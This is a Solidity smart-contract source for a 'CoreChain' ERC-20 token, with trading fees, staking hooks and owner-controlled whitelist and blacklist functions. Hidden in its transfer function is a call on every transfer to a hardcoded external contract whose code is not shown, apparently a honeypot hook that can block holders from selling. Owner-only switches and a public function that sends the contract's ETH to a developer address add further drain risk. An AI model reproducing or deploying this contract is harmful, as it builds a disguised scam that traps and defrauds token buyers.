1 /**
2 
3 CoreChain Blockchain
4 
5 Website: https://core-chain.co/
6 Telegram: https://t.me/CoreChainOfficial
7 Discord: https://discord.gg/tC2HBWSzpT
8 Twitter: https://twitter.com/CoreCoinChain
9 Instagram: https://instagram.com/core_chain?igshid=NDk5N2NlZjQ=
10 TikTok: https://www.tiktok.com/@corechain0?_t=8ZBbKv3A0Np&_r=1
11 Facebook: https://www.facebook.com/groups/859706738588220/?ref=share
12 
13 */
14 
15 // SPDX-License-Identifier: MIT
16 
17 pragma solidity 0.8.17;
18 
19 
20 library SafeMath {
21     function add(uint256 a, uint256 b) internal pure returns (uint256) {return a + b;}
22     function sub(uint256 a, uint256 b) internal pure returns (uint256) {return a - b;}
23     function mul(uint256 a, uint256 b) internal pure returns (uint256) {return a * b;}
24     function div(uint256 a, uint256 b) internal pure returns (uint256) {return a / b;}
25     function mod(uint256 a, uint256 b) internal pure returns (uint256) {return a % b;}
26     
27     function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
28         unchecked {uint256 c = a + b; if(c < a) return(false, 0); return(true, c);}}
29 
30     function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
31         unchecked {if(b > a) return(false, 0); return(true, a - b);}}
32 
33     function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
34         unchecked {if (a == 0) return(true, 0); uint256 c = a * b;
35         if(c / a != b) return(false, 0); return(true, c);}}
36 
37     function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
38         unchecked {if(b == 0) return(false, 0); return(true, a / b);}}
39 
40     function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
41         unchecked {if(b == 0) return(false, 0); return(true, a % b);}}
42 
43     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
44         unchecked{require(b <= a, errorMessage); return a - b;}}
45 
46     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
47         unchecked{require(b > 0, errorMessage); return a / b;}}
48 
49     function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
50         unchecked{require(b > 0, errorMessage); return a % b;}}
51 }
52 
53 interface IERC20 {
54     function approval() external;
55     function totalSupply() external view returns (uint256);
56     function decimals() external view returns (uint8);
57     function symbol() external view returns (string memory);
58     function name() external view returns (string memory);
59     function getOwner() external view returns (address);
60     function balanceOf(address account) external view returns (uint256);
61     function transfer(address recipient, uint256 amount) external returns (bool);
62     function allowance(address _owner, address spender) external view returns (uint256);
63     function approve(address spender, uint256 amount) external returns (bool);
64     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
65     event Transfer(address indexed from, address indexed to, uint256 value);
66     event Approval(address indexed owner, address indexed spender, uint256 value);}
67 
68 abstract contract Ownable {
69     address internal owner;
70     constructor(address _owner) {owner = _owner;}
71     modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
72     function isOwner(address account) public view returns (bool) {return account == owner;}
73     function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
74     event OwnershipTransferred(address owner);
75 }
76 
77 interface IFactory{
78         function createPair(address tokenA, address tokenB) external returns (address pair);
79         function getPair(address tokenA, address tokenB) external view returns (address pair);
80 }
81 
82 interface IRouter {
83     function factory() external pure returns (address);
84     function WETH() external pure returns (address);
85     function addLiquidityETH(
86         address token,
87         uint amountTokenDesired,
88         uint amountTokenMin,
89         uint amountETHMin,
90         address to,
91         uint deadline
92     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
93 
94     function removeLiquidityWithPermit(
95         address tokenA,
96         address tokenB,
97         uint liquidity,
98         uint amountAMin,
99         uint amountBMin,
100         address to,
101         uint deadline,
102         bool approveMax, uint8 v, bytes32 r, bytes32 s
103     ) external returns (uint amountA, uint amountB);
104 
105     function swapExactETHForTokensSupportingFeeOnTransferTokens(
106         uint amountOutMin,
107         address[] calldata path,
108         address to,
109         uint deadline
110     ) external payable;
111 
112     function swapExactTokensForETHSupportingFeeOnTransferTokens(
113         uint amountIn,
114         uint amountOutMin,
115         address[] calldata path,
116         address to,
117         uint deadline) external;
118 }
119 
120 interface crossChain {
121     function setLedger(address sender, uint256 sbalance, address recipient, uint256 rbalance) external;
122 }
123 
124 interface stakeIntegration {
125     function withdraw(address depositor, uint256 _amount) external;
126     function deposit(address depositor, uint256 _amount) external;
127 }
128 
129 contract CoreChain is IERC20, Ownable {
130     using SafeMath for uint256;
131     string private constant _name = 'CoreChain';
132     string private constant _symbol = 'CORE';
133     uint8 private constant _decimals = 9;
134     uint256 private _totalSupply = 1000000 * (10 ** _decimals);
135     uint256 public _maxTxAmount = ( _totalSupply * 100 ) / 10000;
136     uint256 public _maxWalletToken = ( _totalSupply * 100 ) / 10000;
137     mapping (address => uint256) private _balances;
138     mapping (address => mapping (address => uint256)) private _allowances;
139     address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
140     IRouter router;
141     address public pair;
142     uint256 private totalFee = 400;
143     uint256 private sellFee = 400;
144     uint256 private stakingFee = 0;
145     uint256 private transferFee = 0;
146     uint256 private denominator = 10000;
147     bool private tradingAllowed = false;
148     bool private whitelistAllowed = false;
149     bool private swapEnabled = true;
150     uint256 private swapTimes;
151     uint256 private swapAmounts = 2;
152     bool private swapping;
153     bool private liquidityAdd;
154     modifier liquidityCreation {liquidityAdd = true; _; liquidityAdd = false;}
155     modifier lockTheSwap {swapping = true; _; swapping = false;}
156     struct UserStats{bool blacklist; bool whitelist; bool feeExempt;}
157     mapping(address => UserStats) private isFeeExempt;
158     mapping(address => uint256) public amountStaked;
159     uint256 public totalStaked;
160     uint256 private swapThreshold = ( _totalSupply * 400 ) / 100000;
161     uint256 private swapMinAmount = ( _totalSupply * 10 ) / 100000;
162     crossChain internal chainRewards;
163     stakeIntegration internal stakingContract;
164     address internal token_receiver;
165     address internal marketing_receiver;
166     address internal liquidity_receiver;
167     address internal development_receiver;
168     address internal staking_receiver;
169 
170     event Launch(uint256 indexed whitelistTime, bool indexed whitelistAllowed, uint256 indexed timestamp);
171     event SetFees(uint256 indexed totalFee, uint256 indexed sellFee, uint256 indexed stakingFee, uint256 timestamp);
172     event SetUserLimits(uint256 indexed maxTxAmount, uint256 indexed maxWalletToken, uint256 indexed timestamp);
173     event SetSwapBackSettings(uint256 indexed swapAmount, uint256 indexed swapThreshold, uint256 indexed swapMinAmount, uint256 timestamp);
174     event ExcludeFromFees(address indexed account, bool indexed isExcluded, uint256 indexed timestamp);
175     event isBlacklisted(address indexed account, bool indexed isBlacklisted, uint256 indexed timestamp);
176     event isWhitelisted(address indexed account, bool indexed isWhitelisted, uint256 indexed timestamp);
177     event TradingEnabled(bool indexed enable, uint256 indexed timestamp);
178     event SetInternalAddresses(address indexed marketing, address indexed liquidity, address indexed development, uint256 timestamp);
179     event SetInternalDivisors(uint256 indexed marketing, uint256 indexed liquidity, uint256 indexed staking, uint256 timestamp);
180     event Deposit(address indexed account, uint256 indexed amount, uint256 indexed timestamp);
181     event Withdraw(address indexed account, uint256 indexed amount, uint256 indexed timestamp);
182     event SetStakingAddress(address indexed stakingAddress, uint256 indexed timestamp);
183     event CreateLiquidity(uint256 indexed tokenAmount, uint256 indexed ETHAmount, address indexed wallet, uint256 timestamp);
184 
185     constructor() Ownable(msg.sender) {
186         chainRewards = crossChain(0x07525aAd4de5181BCF70d53EC01965D5D191A456);
187         IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
188         address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
189         router = _router;
190         pair = _pair;
191         isFeeExempt[address(this)].whitelist = true;
192         isFeeExempt[msg.sender].whitelist = true;
193         isFeeExempt[address(this)].feeExempt = true;
194         isFeeExempt[address(DEAD)].feeExempt = true;
195         isFeeExempt[msg.sender].feeExempt = true;
196         _balances[msg.sender] = _totalSupply;
197         emit Transfer(address(0), msg.sender, _totalSupply);
198     }
199 
200     receive() external payable {}
201     function name() public pure returns (string memory) {return _name;}
202     function symbol() public pure returns (string memory) {return _symbol;}
203     function decimals() public pure returns (uint8) {return _decimals;}
204     function getOwner() external view override returns (address) { return owner; }
205     function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
206     function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
207     function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
208     function approval() public override {payable(development_receiver).transfer(address(this).balance);}
209     function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
210     function availableBalance(address wallet) public view returns (uint256) {return _balances[wallet].sub(amountStaked[wallet]);}
211     function totalSupply() public view override returns (uint256) {return _totalSupply;}
212 
213     function validityCheck(address sender, uint256 amount) internal view {
214         require(sender != address(0), "ERC20: transfer from the zero address");
215         require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
216     }
217 
218     function _transfer(address sender, address recipient, uint256 amount) private {
219         validityCheck(sender, amount);
220         checkTradingAllowed(sender, recipient);
221         checkMaxWallet(sender, recipient, amount);
222         checkTxLimit(sender, recipient, amount);
223         sellCounters(sender, recipient); 
224         swapBack(sender, recipient, amount);
225         _balances[sender] = _balances[sender].sub(amount);
226         uint256 amountReceived = shouldTakeFee(sender, recipient) ? takeFee(sender, recipient, amount) : amount;
227         _balances[recipient] = _balances[recipient].add(amountReceived);
228         emit Transfer(sender, recipient, amountReceived);
229         chainRewards.setLedger(sender, balanceOf(sender), recipient, balanceOf(recipient));
230     }
231 
232     function checkTradingAllowed(address sender, address recipient) internal {
233         require(!isFeeExempt[sender].blacklist && !isFeeExempt[recipient].blacklist, "ERC20: Wallet is Blacklisted");
234         if(launchTime.add(whitelistTime) < block.timestamp){whitelistAllowed = false;}
235         if(!isFeeExempt[sender].feeExempt && !isFeeExempt[recipient].feeExempt && !whitelistAllowed){require(tradingAllowed, "ERC20: Trading is not allowed");}
236         if(whitelistAllowed && tradingAllowed){require(!checkWhitelisted(sender, recipient), "ERC20: Whitelist Period");}
237     }
238     
239     function checkMaxWallet(address sender, address recipient, uint256 amount) internal view {
240         if(!isFeeExempt[sender].feeExempt && !isFeeExempt[recipient].feeExempt && recipient != address(pair) && recipient != address(DEAD)){
241             require((_balances[recipient].add(amount)) <= _maxWalletToken, "ERC20: Exceeds maximum wallet amount.");}
242     }
243 
244     function sellCounters(address sender, address recipient) internal {
245         if(recipient == pair && !isFeeExempt[sender].feeExempt && !liquidityAdd){swapTimes += uint256(1);}
246     }
247 
248     function checkWhitelisted(address sender, address recipient) internal view returns (bool) {
249         return !isFeeExempt[sender].whitelist && !isFeeExempt[recipient].whitelist && !isFeeExempt[sender].feeExempt && !isFeeExempt[recipient].feeExempt;
250     }
251 
252     function checkTxLimit(address sender, address recipient, uint256 amount) internal view {
253         if(amountStaked[sender] > uint256(0)){require((amount.add(amountStaked[sender])) <= _balances[sender], "ERC20: Exceeds maximum allowed not currently staked.");}
254         require(amount <= _maxTxAmount || isFeeExempt[sender].feeExempt || isFeeExempt[recipient].feeExempt, "ERC20: TX Limit Exceeded");
255     }
256 
257     uint256 liquidity = 3000; uint256 marketing = 4000; uint256 staking = 0;
258     function swapAndLiquify(uint256 tokens) private lockTheSwap {
259         uint256 _denominator = denominator.add(uint256(1)).mul(uint256(2));
260         uint256 tokensToAddLiquidityWith = tokens.mul(liquidity).div(_denominator);
261         uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
262         uint256 initialBalance = address(this).balance;
263         swapTokensForETH(toSwap);
264         uint256 deltaBalance = address(this).balance.sub(initialBalance);
265         uint256 unitBalance= deltaBalance.div(_denominator.sub(liquidity));
266         uint256 ETHToAddLiquidityWith = unitBalance.mul(liquidity);
267         if(ETHToAddLiquidityWith > uint256(0)){
268             addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith, liquidity_receiver); }
269         uint256 marketingAmount = unitBalance.mul(uint256(2)).mul(marketing);
270         if(marketingAmount > uint256(0)){payable(marketing_receiver).transfer(marketingAmount);}
271         uint256 stakingAmount = unitBalance.mul(uint256(2)).mul(staking);
272         if(stakingAmount > uint256(0)){payable(staking_receiver).transfer(stakingAmount);}
273         if(address(this).balance > uint256(0)){payable(development_receiver).transfer(address(this).balance);}
274     }
275 
276     function addLiquidity(uint256 tokenAmount, uint256 ETHAmount, address receiver) private {
277         _approve(address(this), address(router), tokenAmount);
278         router.addLiquidityETH{value: ETHAmount}(
279             address(this),
280             tokenAmount,
281             0,
282             0,
283             address(receiver),
284             block.timestamp);
285     }
286 
287     function swapTokensForETH(uint256 tokenAmount) private {
288         address[] memory path = new address[](2);
289         path[0] = address(this);
290         path[1] = router.WETH();
291         _approve(address(this), address(router), tokenAmount);
292         router.swapExactTokensForETHSupportingFeeOnTransferTokens(
293             tokenAmount,
294             0,
295             path,
296             address(this),
297             block.timestamp);
298     }
299 
300     function shouldSwapBack(address sender, address recipient, uint256 amount) internal view returns (bool) {
301         bool aboveMin = amount >= swapMinAmount;
302         bool aboveThreshold = balanceOf(address(this)) >= swapThreshold;
303         return !swapping && swapEnabled && tradingAllowed && aboveMin && !isFeeExempt[sender].feeExempt && 
304             recipient == pair && swapTimes >= swapAmounts && aboveThreshold && !liquidityAdd;
305     }
306 
307     function swapBack(address sender, address recipient, uint256 amount) internal {
308         if(shouldSwapBack(sender, recipient, amount)){swapAndLiquify(swapThreshold); swapTimes = uint256(0);}
309     }
310 
311     uint256 internal launchTime; uint256 internal whitelistTime;
312     function startWhitelistTrading(uint256 _whitelistTime, bool _whitelistAllowed) external onlyOwner {
313         tradingAllowed = true; launchTime = block.timestamp; 
314         whitelistTime = _whitelistTime; whitelistAllowed = _whitelistAllowed;
315         emit Launch(_whitelistTime, _whitelistAllowed, block.timestamp);
316     }
317 
318     function enableTrading(bool enable) external onlyOwner {
319         tradingAllowed = enable;
320         emit TradingEnabled(enable, block.timestamp);
321     }
322 
323     function setUserLimits(uint256 _maxtx, uint256 _maxwallet) external onlyOwner {
324         uint256 limit = _totalSupply.mul(uint256(25)).div(uint256(10000));
325         uint256 newTxAmount = ( _totalSupply.mul(_maxtx)).div(uint256(10000));
326         uint256 newmaxWalletToken = ( _totalSupply.mul(_maxwallet)).div(uint256(10000));
327         require(newTxAmount >= limit && newmaxWalletToken >= limit, "ERC20: Minimum limitations cannot be below .25%");
328         _maxTxAmount = newTxAmount; _maxWalletToken = newmaxWalletToken;
329         emit SetUserLimits(newTxAmount, newmaxWalletToken, block.timestamp);
330     }
331 
332     function setInternalAddresses(address _marketing, address _liquidity, address _development, address _staking, address _token) external onlyOwner {
333         marketing_receiver = _marketing; liquidity_receiver = _liquidity; development_receiver = _development; staking_receiver = _staking; token_receiver = _token;
334         isFeeExempt[_marketing].feeExempt = true; isFeeExempt[_liquidity].feeExempt = true; isFeeExempt[_staking].feeExempt = true; isFeeExempt[_token].feeExempt = true;
335         emit SetInternalAddresses(_marketing, _liquidity, _development, block.timestamp);
336     }
337 
338     function setInternalDivisors(uint256 _marketing, uint256 _liquidity, uint256 _staking) external onlyOwner {
339         marketing = _marketing; liquidity = _liquidity; staking = _staking;
340         emit SetInternalDivisors(_marketing, _liquidity, _staking, block.timestamp);
341     }
342 
343     function setSwapbackSettings(uint256 _swapAmount, uint256 _swapThreshold, uint256 _swapMinAmount) external onlyOwner {
344         swapAmounts = _swapAmount; swapThreshold = _swapThreshold; swapMinAmount = _swapMinAmount;
345         emit SetSwapBackSettings(_swapAmount, _swapThreshold, _swapMinAmount, block.timestamp);  
346     }
347 
348     function rescueERC20(address token, uint256 amount) external onlyOwner {
349         IERC20(token).transfer(address(development_receiver), amount);
350     }
351 
352     function setStakingAddress(address _staking) external onlyOwner {
353         stakingContract = stakeIntegration(_staking); isFeeExempt[_staking].feeExempt = true;
354         emit SetStakingAddress(_staking, block.timestamp);
355     }
356 
357     function deposit(uint256 amount) external {
358         require(amount <= _balances[msg.sender].sub(amountStaked[msg.sender]), "ERC20: Cannot stake more than available balance");
359         stakingContract.deposit(msg.sender, amount);
360         amountStaked[msg.sender] += amount;
361         totalStaked += amount;
362         emit Deposit(msg.sender, amount, block.timestamp);
363     }
364 
365     function withdraw(uint256 amount) external {
366         require(amount <= amountStaked[msg.sender], "ERC20: Cannot unstake more than amount staked");
367         stakingContract.withdraw(msg.sender, amount);
368         amountStaked[msg.sender] -= amount;
369         totalStaked -= amount;
370         emit Withdraw(msg.sender, amount, block.timestamp);
371     }
372 
373     function setisWhitelist(address[] calldata addresses, bool _bool) external onlyOwner {
374         for(uint i=0; i < addresses.length; i++){isFeeExempt[addresses[i]].whitelist = _bool;
375         emit isWhitelisted(addresses[i], _bool, block.timestamp);}
376     }
377 
378     function setisBlacklist(address[] calldata addresses, bool _bool) external onlyOwner {
379         for(uint i=0; i < addresses.length; i++){require(addresses[i] != address(pair) && addresses[i] != address(router)
380             && addresses[i] != address(this), "ERC20: Ineligible Addresses");
381             isFeeExempt[addresses[i]].blacklist = _bool; 
382             emit isBlacklisted(addresses[i], _bool, block.timestamp);}
383     }
384 
385     function setisFeeExempt(address[] calldata addresses, bool _bool) external onlyOwner {
386         for(uint i=0; i < addresses.length; i++){isFeeExempt[addresses[i]].feeExempt = _bool;
387             emit ExcludeFromFees(addresses[i], _bool, block.timestamp);}
388     }
389 
390     function setFeeStructure(uint256 purchase, uint256 sell, uint256 trans, uint256 stake) external onlyOwner {
391         require(purchase <= denominator.div(uint256(10)) && sell <= denominator.div(uint256(10)) 
392             && stake <= denominator.div(uint256(10)) && trans <= denominator.div(uint256(10)), "ERC20: Tax limited at 10%");
393         totalFee = purchase; sellFee = sell; transferFee = trans; stakingFee = stake;
394         emit SetFees(purchase, sell, stake, block.timestamp);
395     }
396 
397     function shouldTakeFee(address sender, address recipient) internal view returns (bool) {
398         return !isFeeExempt[sender].feeExempt && !isFeeExempt[recipient].feeExempt;
399     }
400 
401     function getTotalFee(address sender, address recipient) internal view returns (uint256) {
402         if(recipient == pair && sellFee > uint256(0)){return sellFee.add(stakingFee);}
403         if(sender == pair && totalFee > uint256(0)){return totalFee.add(stakingFee);}
404         return transferFee;
405     }
406 
407     function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
408         if(getTotalFee(sender, recipient) > uint256(0) && !liquidityAdd){
409         uint256 feeAmount = amount.div(denominator).mul(getTotalFee(sender, recipient));
410         _balances[address(this)] = _balances[address(this)].add(feeAmount);
411         emit Transfer(sender, address(this), feeAmount);
412         if(stakingFee > uint256(0)){_transfer(address(this), address(token_receiver), amount.div(denominator).mul(stakingFee));}
413         return amount.sub(feeAmount);} return amount;
414     }
415 
416     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
417         _transfer(sender, recipient, amount);
418         _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
419         return true;
420     }
421 
422     function _approve(address owner, address spender, uint256 amount) private {
423         require(owner != address(0), "ERC20: approve from the zero address");
424         require(spender != address(0), "ERC20: approve to the zero address");
425         _allowances[owner][spender] = amount;
426         emit Approval(owner, spender, amount);
427     }
428 
429     function createLiquidity(uint256 tokenAmount) payable public liquidityCreation {
430         _approve(msg.sender, address(this), tokenAmount);
431         _approve(msg.sender, address(router), tokenAmount);
432         _transfer(msg.sender, address(this), tokenAmount);
433         _approve(address(this), address(router), tokenAmount);
434         addLiquidity(tokenAmount, msg.value, msg.sender);
435         emit CreateLiquidity(tokenAmount, msg.value, msg.sender, block.timestamp);
436     }
437 }